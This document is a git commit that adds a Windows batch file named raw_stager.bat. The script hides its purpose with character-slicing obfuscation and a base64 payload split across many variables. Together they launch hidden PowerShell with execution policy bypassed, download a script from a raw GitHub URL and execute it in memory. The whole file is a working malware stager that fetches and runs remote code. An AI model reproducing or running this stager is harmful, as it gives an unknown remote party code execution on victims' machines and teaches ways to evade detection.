c14094f27abb6b9d29be5c1630e71e8220711a20
lsdflsdfsmdfksldf <bugblant@gmail.com>
2026-07-28 14:49:13 +0200

    Add files via upload

---
+++ raw_stager.bat
@@ -0,0 +1,26 @@
+@echo off
+
+set "bIUqtJ=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-0123456789 "
+set "KYIKjnbZ=%bIUqtJ:~15,1%%bIUqtJ:~14,1%%bIUqtJ:~22,1%%bIUqtJ:~4,1%%bIUqtJ:~17,1%%bIUqtJ:~18,1%%bIUqtJ:~7,1%%bIUqtJ:~4,1%%bIUqtJ:~11,1%%bIUqtJ:~11,1%%bIUqtJ:~52,1%%bIUqtJ:~4,1%%bIUqtJ:~23,1%%bIUqtJ:~4,1%%bIUqtJ:~64,1%%bIUqtJ:~53,1%%bIUqtJ:~39,1%%bIUqtJ:~14,1%%bIUqtJ:~41,1%%bIUqtJ:~17,1%%bIUqtJ:~14,1%%bIUqtJ:~5,1%%bIUqtJ:~8,1%%bIUqtJ:~11,1%%bIUqtJ:~4,1%%bIUqtJ:~64,1%%bIUqtJ:~53,1%%bIUqtJ:~48,1%%bIUqtJ:~8,1%%bIUqtJ:~13,1%%bIUqtJ:~3,1%%bIUqtJ:~14,1%%bIUqtJ:~22,1%%bIUqtJ:~44,1%%bIUqtJ:~19,1%%bIUqtJ:~24,1%%bIUqtJ:~11,1%%bIUqtJ:~4,1%%bIUqtJ:~64,1%%bIUqtJ:~33,1%%bIUqtJ:~8,1%%bIUqtJ:~3,1%%bIUqtJ:~3,1%%bIUqtJ:~4,1%%bIUqtJ:~13,1%%bIUqtJ:~64,1%%bIUqtJ:~53,1%%bIUqtJ:~30,1%%bIUqtJ:~23,1%%bIUqtJ:~4,1%%bIUqtJ:~2,1%%bIUqtJ:~20,1%%bIUqtJ:~19,1%%bIUqtJ:~8,1%%bIUqtJ:~14,1%%bIUqtJ:~13,1%%bIUqtJ:~41,1%%bIUqtJ:~14,1%%bIUqtJ:~11,1%%bIUqtJ:~8,1%%bIUqtJ:~2,1%%bIUqtJ:~24,1%%bIUqtJ:~64,1%%bIUqtJ:~27,1%%bIUqtJ:~24,1%%bIUqtJ:~15,1%%bIUqtJ:~0,1%%bIUqtJ:~18,1%%bIUqtJ:~18,1%%bIUqtJ:~64,1%%bIUqtJ:~53,1%%bIUqtJ:~30,1%%bIUqtJ:~13,1%%bIUqtJ:~2,1%%bIUqtJ:~14,1%%bIUqtJ:~3,1%%bIUqtJ:~4,1%%bIUqtJ:~3,1%%bIUqtJ:~28,1%%bIUqtJ:~14,1%%bIUqtJ:~12,1%%bIUqtJ:~12,1%%bIUqtJ:~0,1%%bIUqtJ:~13,1%%bIUqtJ:~3,1%%bIUqtJ:~64,1%"
+set UKCok=JAB3AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQ
+set ZthHE=BtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwAu
+set dTvAZ=AEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAE
+set zMwkz=EAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAA
+set NGPFg=JwApADsASQBFAFgAIAAkAHcALgBEAG8AdwBuAGwAbwBhAGQAUw
+set AlEOm=B0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAu
+set LVWPH=AGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAG
+set qhlrb=MAbwBtAC8AbABzAGQAZgBsAHMAZABmAHMAbQBkAGYAawBzAGwA
+set KQybm=ZABmAC8AagB2AGgAZwBiAGoAaABnAHYAZwB2AC8AcgBlAGYAcw
+set aTyDE=AvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwB1AHcAdQBfAGMAdQBz
+set NGwGJ=AHQAbwBtAC4AdAB4AHQAJwApAA==
+
+set "AFcdljYxLz=%UKCok%%ZthHE%%dTvAZ%%zMwkz%%NGPFg%%AlEOm%%LVWPH%%qhlrb%%KQybm%%aTyDE%%NGwGJ%"
+%~d0
+cd %~dp0
+set "hVALvZI=%KYIKjnbZ%%AFcdljYxLz%"
+
+:: DEBUG INFO
+
+
+%hVALvZI%
+exit
